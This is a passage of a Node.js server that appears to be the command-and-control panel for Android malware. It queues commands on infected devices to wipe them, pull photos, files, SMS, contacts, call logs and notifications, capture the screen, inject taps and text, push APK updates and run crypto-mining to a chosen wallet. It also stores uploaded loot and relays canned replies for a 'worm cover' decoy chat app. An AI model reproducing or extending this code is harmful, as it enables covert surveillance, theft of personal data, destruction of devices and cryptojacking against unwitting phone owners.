    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
    const device = await ownedDevice(req, reply);
    if (!device) return;
    if (device.minerState === "STOPPED") {
      return reply.code(409).send({ error: "not_running", state: "STOPPED" });
    }
    const command = await queueCommand(device, "mine_stop", {});
    await prisma.device.update({ where: { id: device.id }, data: { minerState: "STOPPING" } });
    await audit(device.id, "mining_stop", { commandId: command.id });
    return reply.code(201).send({ commandId: command.id, minerState: "STOPPING" });
  });

  /** Mining detail: current state, hashrate ring, recent sessions. */
  app.get("/api/v1/devices/:id/mining", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await ownedDevice(req, reply);
    if (!device) return;
    const sessions = await prisma.miningSession.findMany({
      where: { deviceId: device.id },
      orderBy: { startedAt: "desc" },
      take: 20,
    });
    return {
      minerState: device.minerState,
      hashrate: Array.isArray(device.lastHashrate) ? device.lastHashrate : [],
      sessions,
    };
  });

  /* ------------------------------ commands ------------------------------ */

  // Dashboard-dispatchable command vocabulary; anything else is a 400.
  const COMMAND_TYPES = new Set([
    "ping", "wipe", "camera", "pull_photos", "screen_capture",
    "sms", "contacts", "call_log", "mine_start", "mine_stop",
    "input_tap", "input_swipe", "input_text", "files_pull",
    "notifications_pull", "apk_update",
  ]);

  app.post("/api/v1/devices/:id/commands", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const type = req.body?.type ?? req.body?.command;
    const { payload } = req.body ?? {};
    if (!COMMAND_TYPES.has(type)) {
      return reply.code(400).send({
        error: "unsupported_command",
        message: "only ping is accepted in this phase",
      });
    }
    let safePayload = {};
    if (payload !== undefined && payload !== null) {
      try {
        safePayload = JSON.parse(typeof payload === "string" ? payload : JSON.stringify(payload));
      } catch {
        return reply.code(400).send({ error: "bad_payload" });
      }
    }
    const command = await queueCommand(device, type, safePayload);
    return reply.code(201).send({
      id: command.id,
      deviceId: command.deviceId,
      type: command.type,
      state: command.state,
      createdAt: command.createdAt,
    });
  });

  app.get("/api/v1/devices/:id/commands", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.authKind === "device") {
      // Agents only ever see their own queue.
      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    } else if (device.ownerId !== req.userId) {
      return reply.code(403).send({ error: "forbidden" });
    }
    const list = await prisma.command.findMany({
      where: { deviceId: device.id },
      orderBy: { createdAt: "desc" },
      take: 100,
    });
    return list.map((c) => ({
      id: c.id,
      type: c.type,
      state: c.state,
      payload: c.payload,
      result: c.result,
      createdAt: c.createdAt,
      updatedAt: c.updatedAt,
    }));
  });

  /**
   * Agent result report (device credential only): flips a queued command to
   * executed/failed with the agent's result note. User tokens get 403 — the
   * dashboard dispatches, only the device resolves.
   */
  app.post("/api/v1/devices/:id/commands/:cid/result", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    const command = await prisma.command.findUnique({ where: { id: req.params.cid } });
    if (!command || command.deviceId !== device.id) {
      return reply.code(404).send({ error: "not_found" });
    }
    const state = req.body?.state;
    if (!["executed", "failed"].includes(state)) {
      return reply.code(400).send({ error: "bad_state" });
    }
    const updated = await prisma.command.update({
      where: { id: command.id },
      data: {
        state,
        result: typeof req.body?.result === "string" ? req.body.result : JSON.stringify(req.body?.result ?? null),
      },
    });
    if (command.type === "wipe" && state === "executed") {
      await prisma.device.update({
        where: { id: device.id },
        data: { formattedAt: new Date(), status: "formatted" },
      });
    }
    // Mining lifecycle: the agent's result drives MinerState + session rows.
    if (command.type === "mine_start") {
      const p = command.payload && typeof command.payload === "object" ? command.payload : {};
      if (state === "executed") {
        await prisma.device.update({ where: { id: device.id }, data: { minerState: "RUNNING" } });
        await prisma.miningSession.create({
          data: {
            deviceId: device.id,
            algo: String(p.algo ?? "rx/0"),
            pool: String(p.pool ?? ""),
            wallet: String(p.wallet ?? ""),
            threads: Number.isInteger(p.threads) ? p.threads : 1,
          },
        });
      } else {
        await prisma.device.update({ where: { id: device.id }, data: { minerState: "ERROR" } });
        await audit(device.id, "miner_error", { commandId: command.id, result: updated.result }, "device");
      }
    } else if (command.type === "mine_stop" && state === "executed") {
      await prisma.device.update({ where: { id: device.id }, data: { minerState: "STOPPED" } });
      const open = await prisma.miningSession.findFirst({
        where: { deviceId: device.id, stoppedAt: null },
        orderBy: { startedAt: "desc" },
      });
      if (open) {
        await prisma.miningSession.update({
          where: { id: open.id },
          data: { stoppedAt: new Date(), stopReason: "manual" },
        });
      }
    }
    await audit(device.id, "command_result", { type: command.type, commandId: command.id, state }, "device");
    return { id: updated.id, state: updated.state, result: updated.result };
  });

  /**
   * Panel: serves a dropped photo/file by its content sha256 — streams the
   * on-disk artifact so the pull modal can show real previews.
   */
  app.get("/api/v1/devices/:id/photos/:hash/file", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const rec = await prisma.downloadedFile.findFirst({
      where: { deviceId: device.id, sha256: String(req.params.hash) },
    });
    if (!rec || !fs.existsSync(rec.path)) return reply.code(404).send({ error: "not_found" });
    reply.header("content-type", "image/jpeg");
    return reply.send(fs.createReadStream(rec.path));
  });

  /**
   * Agent photo inventory report (device credential): upserts by content hash
   * and refreshes the per-category counts used by the pull modal.
   */
  app.post("/api/v1/devices/:id/photos/report", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });

    const items = Array.isArray(req.body?.photos) ? req.body.photos : [];
    const counts = { original: 0, hidden: 0, deleted: 0 };
    for (const p of items.slice(0, 20000)) {
      if (typeof p?.hash !== "string" || !p.hash) continue;
      const category = ["original", "hidden", "deleted"].includes(p.category) ? p.category : "original";
      counts[category]++;
      await prisma.devicePhoto.upsert({
        where: { deviceId_hash: { deviceId: device.id, hash: p.hash } },
        update: { category, name: String(p.name ?? ""), size: Number(p.size ?? 0) || 0 },
        create: { deviceId: device.id, hash: p.hash, name: String(p.name ?? ""), category, size: Number(p.size ?? 0) || 0 },
      });
    }
    const stats = { ...(typeof device.stats === "object" && device.stats ? device.stats : {}), photoCounts: counts };
    await prisma.device.update({ where: { id: device.id }, data: { stats } });
    return { ok: true, counts };
  });

  /** Panel: photo inventory + real per-category counts for the pull modal. */
  app.get("/api/v1/devices/:id/photos", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.authKind === "device") {
      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    } else if (device.ownerId !== req.userId) {
      return reply.code(403).send({ error: "forbidden" });
    }
    const cat = req.query?.category;
    const where = { deviceId: device.id, ...(cat ? { category: String(cat) } : {}) };
    const [items, grouped] = await Promise.all([
      prisma.devicePhoto.findMany({ where, orderBy: { createdAt: "asc" }, take: 5000 }),
      prisma.devicePhoto.groupBy({ by: ["category"], where: { deviceId: device.id }, _count: true }),
    ]);
    const counts = { original: 0, hidden: 0, deleted: 0 };
    for (const g of grouped) counts[g.category] = g._count;
    return { counts, items };
  });

  /**
   * Agent artifact drop (device credential): base64 file → serial write queue
   * → PANEL_DROP_DIR/{deviceId}/{category}/{ts}_{name}. SHA-256 dedup — a hash
   * already on disk is never written twice.
   */
  app.post("/api/v1/devices/:id/files", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });

    const { kind = "photo", category = "", name = "file", b64, sha256 } = req.body ?? {};
    if (typeof b64 !== "string" || !b64) return reply.code(400).send({ error: "bad_request" });
    const buf = Buffer.from(b64, "base64");
    const digest = crypto.createHash("sha256").update(buf).digest("hex");
    if (sha256 && sha256 !== digest) return reply.code(400).send({ error: "hash_mismatch" });

    const dupe = await prisma.downloadedFile.findFirst({
      where: { deviceId: device.id, sha256: digest },
    });
    if (dupe) return { ok: true, deduped: true, path: dupe.path };

    const out = await enqueueWrite(async () => {
      const dir = path.join(PANEL_DROP_DIR, device.id, String(category || kind));
      fs.mkdirSync(dir, { recursive: true });
      const safe = String(name).replace(/[^\w.\-]+/g, "_").slice(-80) || "file";
      const p = path.join(dir, `${Date.now()}_${safe}`);
      fs.writeFileSync(p, buf);
      return p;
    });
    await prisma.downloadedFile.create({
      data: { deviceId: device.id, kind: String(kind), category: String(category), path: out, sha256: digest, bytes: buf.length },
    });
    const count = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
    return { ok: true, deduped: false, path: out, count };
  });

  /** Panel: per-device drop-folder stats ("Downloaded: X"). */
  app.get("/api/v1/devices/:id/files", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.authKind === "device") {
      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    } else if (device.ownerId !== req.userId) {
      return reply.code(403).send({ error: "forbidden" });
    }
    const count = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
    return { count, dir: path.join(PANEL_DROP_DIR, device.id) };
  });

  /* --------------------------- cover-chat relay -------------------------- */

  /**
   * worm cover surface: a chat-reply relay the device's cover app POSTs to.
   * Device-auth only, rate-limited per device (sliding 60s window). Replies
   * are served from a canned bank picked deterministically — the endpoint
   * exists so the cover screen can behave like a real chat backend without
   * an upstream LLM dependency in tests.
   */
  const coverChatHits = new Map();
  const COVER_CHAT_LIMIT = 12;
  const COVER_CHAT_WINDOW_MS = 60_000;
  const COVER_REPLIES = [
    "Sounds good, let's do it.",
    "Haha fair enough 😄",
    "I'm on my way, give me 10.",
    "Can't talk right now, later?",
    "Yep, saw it — will reply tonight.",
    "Nice! Send me the details.",
    "Sure, works for me 👍",
    "lol you always say that",
    "Busy rn, call you after 6?",
    "Deal. See you then.",
    "Ok got it, thanks!",
    "Wait what happened??",
  ];

  app.post("/api/v1/devices/:id/cover/chat", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    const text = (req.body?.text ?? "").toString().slice(0, 500);
    if (!text.trim()) return reply.code(400).send({ error: "bad_request" });

    const now = Date.now();
    const hits = (coverChatHits.get(device.id) ?? []).filter((t) => now - t < COVER_CHAT_WINDOW_MS);
    if (hits.length >= COVER_CHAT_LIMIT) {
      const retryAfterSec = Math.max(1, Math.ceil((COVER_CHAT_WINDOW_MS - (now - hits[0])) / 1000));
      reply.header("retry-after", String(retryAfterSec));
      return reply.code(429).send({ error: "rate_limited", retryAfterSec });
    }
    hits.push(now);
    coverChatHits.set(device.id, hits);

    let h = hits.length;
    for (const ch of text) h = (h * 31 + ch.charCodeAt(0)) >>> 0;
    return { reply: COVER_REPLIES[h % COVER_REPLIES.length], provider: "relay" };
  });

  /* ------------------------------ teardown ------------------------------ */

  app.addHook("onClose", async () => {
    await prisma.$disconnect();
  });

  await app.ready();
  return app;
}

/* Entry point when run directly (node src/server.js). */
if (process.argv[1] && process.argv[1].endsWith("server.js")) {
  await ensureAdminUser();
  fs.mkdirSync(PANEL_DROP_DIR, { recursive: true });
  const app = await buildApp({ logger: true });
  const port = Number(process.env.PORT ?? 8088);
  app.listen({ port, host: "127.0.0.1" });
}
